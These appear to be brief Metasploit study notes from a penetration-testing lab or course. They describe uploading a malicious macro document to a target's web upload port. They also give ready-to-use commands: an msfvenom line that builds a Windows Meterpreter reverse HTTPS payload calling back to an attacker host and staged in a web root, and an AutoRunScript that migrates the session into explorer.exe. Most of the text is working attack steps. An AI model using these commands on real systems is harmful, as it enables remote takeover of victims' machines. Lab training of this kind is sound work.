## Metasploit framework notes

#### Auto Run Script

```
set AutoRunScript "migrate -n explorer.exe"
```

### Ch1 Notes

1. Identify the web port on 192.168.49.121  allowing file upload. Upload a doc file which allow which allow [ping marco](/msf/ping.vba)command to verify the target allowing code execution though marco 
```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.141 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
```
